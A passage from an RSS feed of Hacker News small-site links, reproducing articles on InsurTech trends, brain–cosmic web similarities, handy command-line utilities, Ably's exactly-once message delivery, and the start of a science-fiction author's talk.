replicate.</strong></p></blockquote><p>Protobuf object provides attribute access already. For simple data types such as <code>str</code>, <code>float</code>, <code>int</code>, the experience is good enough. We do not want to replicate every attribute defined in Protobuf again in the Jina data type, but really focus on the ones that need unique logic or particular attention.</p><p>To delegate attribute getter/setter to Protobuf object, all Jina data types implement the following fallback:</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span><span>def</span> <span>__getattr__</span><span>(self, name: str)</span>:</span></span><br><span>    <span>return</span> getattr(self._inner_proto, name)</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>Mor…</strong></p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/">https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/</a></em></p>]]>
            </description>
            <link>https://hanxiao.io/2020/11/22/Primitive-Data-Types-in-Neural-Search-System/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185355</guid>
            <pubDate>Mon, 23 Nov 2020 10:33:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future of InsurTech: Innovations and Breakthrough Solutions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185143">thread link</a>) | @cpepper
<br/>
November 23, 2020 | https://codeandpepper.com/the-future-of-insurtech/ | <a href="https://web.archive.org/web/*/https://codeandpepper.com/the-future-of-insurtech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
<p>Many sports fans have a saying, often expressed on a wall of their neighborhood building: “you will never walk alone”. It shows the mass support of the entire ecosystem designed to help the team. The same goes for InsurTech—the future of the industry lies in platforms and ecosystems. Everything in favour of interconnected services, giving the user the ultimate experience.</p>



<div><figure><amp-img width="864" height="450" src="https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01.jpg" alt="InsurTech innovations" srcset="https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01.jpg 864w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-300x156.jpg 300w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-768x400.jpg 768w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-361x188.jpg 361w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-192x100.jpg 192w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-720x375.jpg 720w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-432x225.jpg 432w" sizes="(max-width: 864px) 100vw, 864px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="864" height="450" src="https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01.jpg" alt="InsurTech innovations" srcset="https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01.jpg 864w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-300x156.jpg 300w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-768x400.jpg 768w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-361x188.jpg 361w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-192x100.jpg 192w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-720x375.jpg 720w, https://codeandpepper.com/wp-content/uploads/2020/11/Future_Insuretech_01-432x225.jpg 432w" sizes="(max-width: 864px) 100vw, 864px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzQ1MCcgd2lkdGg9Jzg2NCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></figure></div>



<h2 id="h-what-users-want-from-insurtech-innovations">What users want from InsurTech innovations…</h2>



<p>Customer behaviour patterns, needs and benefits-driven decisions shape whole companies, their products and efforts, towards <b>technological innovation as an ongoing process</b>. High tech like artificial intelligence (AI), Big Data, and machine learning are used on a daily basis. Alongside the software-as-a-service (SaaS) business model, technology trends ignite the minds of executives inside the insurance industry. Thanks to their efforts, companies can adjust business models and tailor the experience for paying customers.</p>



<p>The shift towards a <b>customer-centric approach</b> stems from the fact that customers don’t want the communication to be about the product. They want it to be about them. According to <a href="https://worldinsurancereport.com/wp-content/uploads/sites/6/2020/05/World-Insurance-Report-2020.pdf" target="_blank" rel="noreferrer noopener nofollow">Capgemini’s World Insurance 2020 report</a>, customers trust online research, social media testimonials and friends over agent/broker advice, and want to make independent decisions.</p>



<p>At the same time, the gap between the Millennials and older generations is virtually gone. Both groups do online or mobile transactions on a similar level (around 63%). Their risk assessment is surprisingly similar. While people go through life cycles and obtain high-value properties, get married or find new jobs, their priorities are gradually changing. Customers want to feel covered and secure, and experts say the same is true for both age groups. The difference is, the new generation expects an even higher standard of care. That’s where InsurTech innovations come in.</p>



<h2 id="h-and-how-these-innovations-look-like">…and how these innovations look like</h2>



<p>The InsurTech ecosystem is more than a network of partnerships. As <a href="https://insuranceblog.accenture.com/the-ultimate-guide-to-insurance-ecosystems" target="_blank" rel="noreferrer noopener nofollow">explained in detail by Accenture</a>, “in an ecosystem, stakeholders are connected not only with the aim of obtaining a commercial advantage but also of disrupting the market by leveraging innovative experiences that are possible as a result of a partnership”. In plain English: many companies are upping their game. 51% of executives say they already experience market disturbance from companies partnered up with organisations from other industries.</p>



<p>What can traditional insurers bring to the table while undergoing <a href="https://codeandpepper.com/services/digital-transformation-it-services/">digital transformation</a> and developing modern financial services? They have at their disposal <b>decades of industry experience and institutional knowledge of complex regulations</b>. However, what insurers still lack, according to Accenture, are company culture, technology, and resources. To create or improve them all, insurance companies have to ask themselves two questions:</p>



<ul><li>How to give the customer a better experience?</li><li>How to enhance the already existing business model?</li></ul>



<p>The answer lies in Asia, where companies have managed to combine the three values typical for modern insurance solutions:</p>



<ul><li><b>Friction-reducing gateways</b> for customers switching between related services. Just like Facebook’s Messenger allows for shopping or checking into a hotel, new insurance products present similar opportunities. They will give you complementary services and help you manage insurance financing.</li><li><b>Integrating data from different services</b>. Having data is having a market advantage. The <a href="https://codeandpepper.com/2020/06/02/kyc-digital-identity-verification-leaders">know your customer (KYC) approach</a> gives InsurTechs the necessary insights to better address customer needs and market their offer.</li><li><b>Building a network of companies and apps</b> offering products, assistance, and combined value in a cross-selling model. This strategy is similar to the social mechanism used in recommendation engines (e.g. “a customer who bought product X was also interested in product Y”).</li></ul>



<h2 id="h-the-future-of-insurtech-is-here">The future of InsurTech is here</h2>



<p>The reason InsurTech thrives in Asia is that insurance processes serve everyday, real-life needs. <a href="https://pasarpolis.io/en" target="_blank" rel="noreferrer noopener nofollow">PasarPolis</a> from Indonesia sells micro policies from $2. And yes, that’s the total cost. The company promotes the “instant claim” service as a fully automated feature. If your flight is delayed—you get paid, no formalities or questions asked. <a href="https://gigacover.com/" target="_blank" rel="noreferrer noopener nofollow">Gigacover</a> from Singapore offers insurance in bulk, maintaining low rates on a month-to-month basis. One of their most popular products is freelance income protection (FLIP), which costs under 40 US cents per day. Meanwhile, <a href="https://www.thecarevoice.com/" target="_blank" rel="noreferrer noopener nofollow">CareVoice</a> uses mobile-based and data-driven SaaS solutions to deliver a more user-friendly and less complicated experience.</p>



<p>That’s the level of disruption the industry must face right now. <b>It’s not one model, it’s flexibility and focus on local needs.</b> Some say eliminating agents (middlemen in the sales process) is the way to go, but Asian markets prove that people still want to do business with people. Customers in this part of the world don’t like to browse through possibly outdated user manuals. The Indian <a href="https://www.mintpro.in/" target="_blank" rel="noreferrer noopener nofollow">MintPro</a> by Turtlemint uses agents who can quickly explain policy details by phone. The sale itself is completed via mobile. The Indonesian <a href="https://www.fuse.co.id/home/AGENT" target="_blank" rel="noreferrer noopener nofollow">Fuse Pro</a> goes even further and hires smartphone users as part-time sellers of the company insurance products.</p>



<h3 id="h-by-the-people-for-the-people">By the people, for the people</h3>



<p>Many Asian ideas for apps and business models come from <b>addressing very basic needs</b>. In many parts of the continent, the public health service is much to be desired. <a href="https://shuidihuzhu.com/" target="_blank" rel="noreferrer noopener nofollow">Waterdrop</a>, which goes by Shuidihuzhu in China (translated as “water drop mutual help”), uses a mix of models. One of them encourages customers to make periodic contributions to the mutual aid pool. It’s insurance going back to basics: when merchants co-founded themselves in case any of them ran out of profit. It’s similar, simply adjusted for modern needs—people are helping themselves using technology, instead of market gatherings.</p>



<p>Another interesting company is <a href="https://www.policybazaar.com/" target="_blank" rel="noreferrer noopener nofollow">PolicyBazaar</a>, an Indian app operating as an all-you-need offer aggregator. The platform lets you browse for everything: from car insurance, through retirement plans, to Covid-19 coverage. Instant claims and live assistants complete the picture of a customer-first policy.</p>



<h3 id="h-big-data-and-telematics">Big Data and telematics</h3>



<p>Driving behaviour is one of the biggest risks and variables for underwriters. That’s why insurance technologies make sure this risk can be mitigated. The <b>adoption of telematics</b> has unlocked new business models:</p>



<ul><li>usage-based insurance (UBI)</li><li>pay-as-you-drive (PAYD)</li><li>pay-how-you-drive (PHYD)</li></ul>



<p>There’s already a good use case. A British company O2 has launched a <a href="https://www.o2.co.uk/business/iot/solutions/smartvehicle" target="_blank" rel="noreferrer noopener nofollow">car insurance product</a> that rewards users for safe driving. In a nutshell—the safer the drive, the lower the insurance cost.</p>



<p>There’s also an interesting case of using peer-to-peer (P2P) business model. The German <a href="https://www.friendsurance.com/" target="_blank" rel="noreferrer noopener nofollow">Friendsurance</a> connects a group of people (from 10 to 16) via their mobile app. Focused on small property risks, like a broken car window, the startup offers users a pre-agreed cashback from the collective fund. This InsurTech innovation wouldn’t be possible without knowing how people live their lives and how to help them.</p>



<h2 id="h-this-is-a-group-walk">This is a group walk</h2>



<p>We are observing a strong trend of going back to basics. Insurance innovations come from cutting the “red tape” and including customers in the decision-making process. One click for a claim, one click away from every other functionality. Sports events are powerful because they generate emotions. Insurance is a touchy subject because it deals with emotions. Walking side by side with your customers allows you to create or improve the application. <a href="https://codeandpepper.com/services/insurance-insurtech-software-development">InsurTech software development</a> isn’t easy so let’s walk together on this journey.</p>
          </div></div>]]>
            </description>
            <link>https://codeandpepper.com/the-future-of-insurtech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185143</guid>
            <pubDate>Mon, 23 Nov 2020 09:56:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does the human brain resemble the Universe?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25185066">thread link</a>) | @signa11
<br/>
November 23, 2020 | https://www.unibo.it/en/notice-board/does-the-human-brain-resemble-the-universe | <a href="https://web.archive.org/web/*/https://www.unibo.it/en/notice-board/does-the-human-brain-resemble-the-universe">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
                
                  <p><img src="https://www.unibo.it/en/images/in-evidenza-piccole/universe/@@images/74a68e4e-af13-4c68-874d-1244b70e7fd2.jpeg" alt="Universe" title="Universe" height="152" width="200"></p><p>In their paper published in <i>Frontiers of Physics</i>, Franco Vazza (astrophysicist at the University of Bologna) and Alberto Feletti (neurosurgeon at the University of Verona) investigated the similarities between two of the most challenging and complex systems in nature: the cosmic network of galaxies and the network of neuronal cells in the human brain.</p>

<p>Despite the substantial difference in scale between the two networks (more than 27 orders of magnitude), their quantitative analysis, which sits at the crossroads of cosmology and neurosurgery, suggests that diverse physical processes can build structures characterized by similar levels of complexity and self-organization.</p>

<p>The human brain functions thanks to its wide neuronal network that is deemed to contain approximately 69 billion neurons. On the other hand, the observable universe can count upon a <i>cosmic web</i> of at least 100 billion galaxies. Within both systems, only 30% of their masses are composed of galaxies and neurons. Within both systems, galaxies and neurons arrange themselves in long filaments or nodes between the filaments. Finally, within both system, 70% of the distribution of mass or energy is composed of components playing an apparently passive role: water in the brain and dark energy in the observable Universe.</p>

<p>Starting from the shared features of the two systems, researchers compared a simulation of the network of galaxies to sections of the cerebral cortex and the cerebellum. The goal was to observe how matter fluctuations scatter over such diverse scales.</p>

<p>"We calculated the spectral density of both systems. This is a technique often employed in cosmology for studying the spatial distribution of galaxies", explains Franco Vazza. "Our analysis showed that the distribution of the fluctuation within the cerebellum neuronal network on a scale from 1 micrometre to 0.1 millimetres follows the same progression of the distribution of matter in the <i>cosmic web</i> but, of course, on a larger scale that goes from 5 million to 500 million light-years".</p>

<p>The two researchers also calculated some parameters characterising both the neuronal network and the cosmic web: the average number of connections in each node and the tendency of clustering several connections in relevant central nodes within the network.&nbsp;</p>

<p>"Once again, structural parameters have identified unexpected agreement levels. Probably, the connectivity within the two networks evolves following similar physical principles, despite the striking and obvious difference between the physical powers regulating galaxies and neurons", adds Alberto Feletti. "These two complex networks show more similarities than those shared between the cosmic web and a galaxy or a neuronal network and the inside of a neuronal body".&nbsp;</p>

<p>The encouraging results of this pilot study are prompting the researchers to think that new and effective analysis techniques in both fields, cosmology and neurosurgery, will allow for a better understanding of the routed dynamics underlying the temporal evolution of these two systems.</p>

<p>This study was published in <i>Frontiers of Physics</i> with the title "The quantitative comparison between the neuronal network and the cosmic web”. Its authors are Franco Vazza from the Department of Physics and Astronomy of the University of Bologna, and Alberto Feletti from the Department of Neurosciences, Biomedicine and Movement of the University of Verona.</p>
            </div></div>]]>
            </description>
            <link>https://www.unibo.it/en/notice-board/does-the-human-brain-resemble-the-universe</link>
            <guid isPermaLink="false">hacker-news-small-sites-25185066</guid>
            <pubDate>Mon, 23 Nov 2020 09:38:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Command-line Utilities to Improve your Workflows]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25184970">thread link</a>) | @nithishr
<br/>
November 23, 2020 | https://blog.nithishr.com/6-command-line-utilities-to-improve-your-workflows | <a href="https://web.archive.org/web/*/https://blog.nithishr.com/6-command-line-utilities-to-improve-your-workflows">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1606122057930/WRgEmsDV8.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>We spend a lot of time as engineers on our terminals. Here is a list of 6 command-line utilities that can help you boost your productivity on the terminal. </p>
<h3 id="1-autojump-j">1. Autojump (j)</h3>
<p>Autojump is a fast way to navigate your filesystem. It keeps track of the directories that you access &amp; their usage frequency. </p>
<p><strong>Usage: </strong></p>
<ul>
<li>To navigate to a directory that contains <code>Downloads</code> from any directory in the filesystem<pre><code><span>j</span> Downloads
</code></pre></li>
</ul>
<p><a target="_blank" href="https://github.com/wting/autojump">Link</a></p>
<h3 id="2-bat">2. bat</h3>
<p>Bat is a <code>cat</code> clone with support for syntax highlighting for the commonly used programming languages &amp; markup formats.</p>
<p><strong>Usage:</strong></p>
<pre><code><span>bat</span> filename
</code></pre><p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606077167750/-lbEqzpcQ.png?auto=format&amp;q=60" alt="bat highlighting the syntax of Python"> </p>
<p><a target="_blank" href="https://github.com/sharkdp/bat">Link</a></p>
<h3 id="3-fuzzy-finder-fzf">3. Fuzzy Finder (fzf)</h3>
<p>Fuzzy Finder is an interactive command-line tool for fuzzy search. You can use it to find the files by typing a few characters of the file with instant feedback. </p>
<p>You can also use it to search any list on the terminal such as command history, git logs, processes, etc.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606079217983/mXFlK5pfe.gif?auto=format,compress&amp;gif-q=60" alt="Demo of fzf"></p>
<p><a target="_blank" href="https://github.com/junegunn/fzf">Link</a></p>
<h3 id="4-tldr">4. tldr</h3>
<p>Have you felt that the man pages are too verbose when you are looking for an option for a command? </p>
<p>Try <code>tldr</code> which gives you community-maintained help pages for command-line tools. </p>
<p><strong>Usage</strong></p>
<pre><code><span>tldr</span> command_or_utility
</code></pre><p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606079807478/HgaLUvow2.png?auto=format&amp;q=60" alt="tldr for man pages"></p>
<p><a target="_blank" href="https://github.com/tldr-pages/tldr">Link</a></p>
<h3 id="5-cal">5. cal</h3>
<p><code>cal</code> shows you the calendar in your terminal. </p>
<p>For those times when you do not remember today's day or date!</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606080750469/YqjLJJKqD.png?auto=format&amp;q=60" alt="cal showing the calendar on the terminal"></p>
<h3 id="6-sudo">6. sudo !!</h3>
<p>Did you have to run the last command as a superuser instead of your normal user? <code>sudo !!</code> can come to your rescue. It runs the last command as a superuser. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606081057127/25y4wZmjn.png?auto=format&amp;q=60" alt="Example of running previous command as superuser"></p>
<p>Let me know which one you use or would use in the comments!</p>
<p>Do you have any additions to this list? Share it in the comments.</p>
</div></div></section></div>]]>
            </description>
            <link>https://blog.nithishr.com/6-command-line-utilities-to-improve-your-workflows</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184970</guid>
            <pubDate>Mon, 23 Nov 2020 09:18:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Achieving exactly-once message processing with Ably]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25184774">thread link</a>) | @kiyanwang
<br/>
November 23, 2020 | https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/ | <a href="https://web.archive.org/web/*/https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>Exactly-once is a desirable (if not critical) message delivery guarantee and a remarkably complex engineering challenge to solve. In this blog post, we will look at what exactly-once means in the context of distributed pub/sub systems, and the exactly-once guarantees that the <a href="https://www.ably.io/">Ably</a> realtime pub/sub messaging platform provides. Ably often acts as the broker in data streaming pipelines: publishers send messages to our platform, and we deliver these messages to subscribers. As a broker, Ably provides regional &amp; global fault tolerance, which ensures message availability and survivability. We also offer a set of capabilities via SDKs that enable clients to use idempotent publishing, and recover in the event of a failure while resuming precisely where they left off, with no lost or duplicate messages.</p>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png"></figure><h2 id="exactly-once-delivery-is-one-of-the-hardest-engineering-challenges">Exactly-once delivery is one of the hardest engineering challenges<br>
</h2>
<p>In the context of distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems, exactly-once is a popular concept and a desirable, if not critical, system property. It also leads to confusion and diverging opinions within the development community. On the one hand, some argue that <a href="https://bravenewgeek.com/you-cannot-have-exactly-once-delivery/">exactly-once is simply unachievable.</a> On the other hand, there are systems such as <a href="https://kafka.apache.org/documentation/#semantics">Kafka that claim to support exactly-once semantics</a>. </p>
<p>We believe that a lot of the confusion around the concept has to do with the fact that there's no clear definition of what exactly-once actually means. It's arguably impossible to come up with a definition to satisfy everyone and every use case. That's because exactly-once can mean different things for different systems and different use cases. Regardless of how you look at it, though, exactly-once is, without a doubt, a distinctively complex engineering challenge. </p>
<p>Let’s now define what exactly-once means for Ably in particular. In our case, exactly-once is a guarantee that once acknowledged, a message published to Ably is <strong>delivered</strong> to a consumer precisely once, even in the context of individual system components failing. Note that most often, Ably is used to deliver messages in real time directly to end-user devices.</p>
<p>It’s crucial to mention that exactly-once is a system-wide property, and you only achieve it if all the constituent components play their part. This doesn’t mean that all the components must display exactly-once characteristics. For example, in our case, you can have a publisher that displays at-least-once behaviour. However, Ably provides an idempotent interface, which cancels out the fact that the producer may occasionally publish messages more than once. As long as at the other end of the pub/sub pipeline each message is delivered to subscribers precisely once, exactly-once behaviour is achieved as a whole.</p>
<h3 id="types-of-messaging-semantics">Types of messaging semantics<br>
</h3>
<p>Before we dive deeper into exactly-once delivery, let’s review the main types of messaging semantics. When a system is fully operational and working as intended, exactly-once delivery is the behaviour you generally expect. However, we must also consider how faults in the pub/sub system or, indeed, clients affect this behaviour. While most components fail independently in a distributed pub/sub system, without directly impacting other components, the overall quality of service can be affected. Depending on how the system behaves when failures do occur, you get several different types of messaging semantics:</p>
<ul>
<li>
<strong>At-most-once semantics</strong>. The easiest type of semantics to achieve, from an engineering complexity perspective, since it can be done in a fire-and-forget way. There's rarely any need for the components of the system to be stateful. While it's the easiest to achieve, at-most-once is also the least desirable type of messaging semantics. It provides no absolute message delivery guarantees since each message is delivered once (best case scenario) or not at all.</li>
<li>
<strong>At-least-once semantics. </strong>This is an improvement on at-most-once semantics. There might be multiple attempts at delivering a message, so at least one attempt is successful. In other words, there's a chance messages may be duplicated, but they can't be lost. While not ideal as a system-wide characteristic, at-least-once semantics are good enough for use cases where duplication of data is of little concern, or scenarios where deduplication is possible on the consumer side.</li>
<li>
<strong>Exactly-once semantics</strong>. The ultimate message delivery guarantee and the optimal choice in terms of data integrity. As its name suggests, exactly-once semantics means that each message is delivered precisely once. The message can neither be lost nor delivered twice (or more times). Exactly-once is by far the most dependable message delivery guarantee. It’s also the hardest to achieve.</li>
</ul>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif" alt="Overview of message delivery semantics: at-most-once delivery, at-least-once delivery, exactly-once delivery."><figcaption>High-level overview of message delivery semantics</figcaption></figure><p>What most distributed pub/sub systems can genuinely guarantee is <strong>mostly-once </strong>delivery. This means that when the system is functioning as intended, messages are delivered exactly once. However, when failures are involved, there’s always a chance some messages will be delivered either at-most-once or at-least-once.</p>
<h3 id="failures-that-prevent-exactly-once-delivery">Failures that prevent exactly-once delivery<br>
</h3>
<p>To demonstrate just how hard it is for distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems to achieve exactly-once semantics, we must talk about failures—specifically, components that can fail and how these failures can be mitigated.<br></p>
<p><strong>Publisher failure</strong></p>
<p>When a publisher fails, some sort of recovery process takes place. Depending on its design, after recovery, the publisher may reattempt to publish a message that has already been sent to and acknowledged by the broker. In such an event, the publisher failure causes at-least-once behaviour. Another scenario is that the publisher’s recovery procedure fails to realise that the publish attempt failed, which leads to at-most-once behaviour. </p>
<p>A strategy often used after a publish failure is to retry publishing the same message a fixed number of times. This is a pragmatic approach, but unsatisfactory in the context of exactly-once. Imagine that the publisher recovers and unsuccessfully tries to republish the same message five times, and then gives up. Practically none of the three semantics is achieved. To mitigate publisher failures Ably supports <a href="https://www.ably.io/topic/idempotency">idempotent publishing</a>, which ensures that regardless of how many times the same message is published to Ably, it will be delivered to subscribers exactly-once. <br></p>
<p><strong>Broker failure</strong></p>
<p>A broker failure has the potential to lead to all sorts of issues, including data loss. That’s why it’s recommended to design your system around the idea of mitigating or preventing loss of data. From a producer perspective, this could mean having the ability to publish messages at-least-once, so they can be resent to the broker if needed. </p>
<p>From a broker perspective (Ably included), let’s start by reviewing what a message ACK means. Obviously, it’s an acknowledgment that a published message has been received. Additionally, it should also imply that no subsequent failure will result in that message not being delivered to subscribers. In other words, it should be an acknowledgment that the broker provides sufficient redundancy to ensure continuity of service and onwards processing, even in the context of multiple infrastructure failures. Of course, nothing can be done to prevent or mitigate certain types of critical failures. When that happens, the sensible thing for the broker to do is to respond with a failure response (with HTTP, this is typically a 5xx status code), indicating clearly to the producer that the publish attempt was unsuccessful. </p>
<p><strong>Subscriber failure</strong></p>
<p>The most common subscriber failure that prevents exactly-once delivery involves short disconnections. For example, a client app on a mobile device will disconnect and quickly reconnect when the user switches from a mobile data network to a Wi-Fi network or goes through a tunnel. To counter this scenario and ensure exactly-once behaviour, the stream of messages must resume precisely where it left off when the subscriber recovers. For this to be possible, the connection state must be persisted and resynced when the subscriber reconnects.</p>
<p>If the broker is the one keeping track of the last message sent, you are unlikely to provide exactly-once semantics. That’s because a broker might send a message, and the subscriber might successfully receive it and then disconnect before sending an ACK to the broker. In such a case, once the subscriber reconnects, the broker will resend the respective message (at-least-once semantics) since it has no way of knowing that the subscriber had received it before disconnecting.</p>
<p>To ensure exactly-once behaviour, the responsibility of keeping track of the last message received should sit with the subscriber - something we also do at Ably, via serial numbers. This way, when the subscriber reconnects, it notifies the broker of the last message it has received so that the stream can be accurately resumed from a point in time.</p>
<h3 id="exactly-once-semantics-use-cases">Exactly-once semantics use cases</h3>
<p>In the world of distributed pub/sub systems, exactly-once semantics has been and continues to be extremely hard to achieve. Equally, almost everywhere you look in software development, exactly-once is a highly desirable system-wide property, if not an essential one. For example, exactly-once is crucial for most transactional messaging use cases. At its core, a transactional message is triggered by a consumer action, and it usually includes necessary or high-priority info, e.g., a bank balance inquiry or an order confirmation. </p>
<p>Ordered operations represent another use case where exactly-once is fundamental. Let’s say you want to use <a href="https://www.ably.io/blog/message-delta-compression/">delta compression</a> to only stream changes from the previous message to subscribers each time there’s an update. To achieve this, you need to use a transport that ensures data integrity through guaranteed message ordering and exactly-once semantics.</p>
<p>If not crucial, exactly-once is at least highly desirable, because it improves overall system predictability and provides better experiences to users in general. For example, …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/">https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/</a></em></p>]]>
            </description>
            <link>https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184774</guid>
            <pubDate>Mon, 23 Nov 2020 08:44:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Instructions for the Age of Emergency (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25184662">thread link</a>) | @klunger
<br/>
November 23, 2020 | https://monicacatherine.com/2018/02/08/instructions-for-the-age-of-emergency/ | <a href="https://web.archive.org/web/*/https://monicacatherine.com/2018/02/08/instructions-for-the-age-of-emergency/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-3572">
			
			<p><small><span><b>Posted:</b> February 8, 2018</span>  <span>|</span> <span><b>Filed under:</b> <a href="https://monicacatherine.com/category/uncategorized/" rel="category tag">Uncategorized</a></span> <span></span> <span></span> <span>|</span></small></p><p><img data-attachment-id="3573" data-permalink="https://monicacatherine.com/2018/02/08/instructions-for-the-age-of-emergency/img_5890-1/" data-orig-file="https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg" data-orig-size="4032,3021" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 6s&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1517591142&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.15&quot;,&quot;iso&quot;:&quot;320&quot;,&quot;shutter_speed&quot;:&quot;0.066666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="IMG_5890 (1)" data-image-description="" data-medium-file="https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=300" data-large-file="https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=590" src="https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=590" alt="IMG_5890 (1)" srcset="https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=590 590w, https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=1180 1180w, https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=150 150w, https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=300 300w, https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=768 768w, https://monicacatherine.files.wordpress.com/2018/02/img_5890-1.jpg?w=1024 1024w" sizes="(max-width: 590px) 100vw, 590px"></p>
<p>Halbert W. Hall Speaker’s Series on Science Fiction and Fantasy,&nbsp;Texas A&amp;M University</p>
<p>February 2, 2018</p>
<p><a href="https://drive.google.com/open?id=1vZQXkxJ9FVwCmhHZTBGkuxMHGF8hoWK_">Full Audio</a></p>
<p>~</p>
<p>Thank you so much to Texas A&amp;M for hosting me, and especially to the Science Fiction Archivist, Jeremy Brett, who invited me and orchestrated everything. He’s been a supporter of my work for years, and I’m so delighted to finally meet him, and to have the chance to address all of you. I’d also like to thank TAMU Libraries, the Glasscock Center for Humanities Research and its Science Fiction Studies Working Group, the Department of English, the Department of International Studies, and the Department of Visualization. I’m so honored by such an intersectional effort to bring me here. So thank you.</p>
<p>As Jeremy said, I write a lot of things, but when people ask me what I am, the first thing I say is that I’m a science fiction writer. I gave Jeremy a name for this talk before I wrote any of it, because I was still finishing my next novel. It’s called <em>The Actual Star. </em>It’s taken me six years to write. My agent is reading it as we speak. It jumps back and forth from the distant past, during the collapse of ancient Maya civilization; to the present, specifically the year 2012; to the far future, when a new global religion has brought lasting peace to humankind. So I spent a lot of the past year in the year 3012, in my head, imagining what the world will look like a thousand years from now. I want to talk to you about it because, like all science fiction, even though it’s set in the future, it’s a response to our present moment. My talk is called “Instructions for the Age of Emergency,” which is the time period we’re living in right now. In the far future, there are entire fields of study devoted to it, and to the people who lived in it, and what we must have been thinking.</p>
<p>During the last year, I locked myself out of social media for months at a time. I had to concentrate on work and, to be honest, protect my mental health after the election. I only read <em>The Washington Post</em> on my phone in bed in the morning—I still do—and that was enough. Everything I read, I asked myself, “How did we get here? What are the root causes? How can things be different?” And then I would try to answer those questions in the day’s writing.</p>
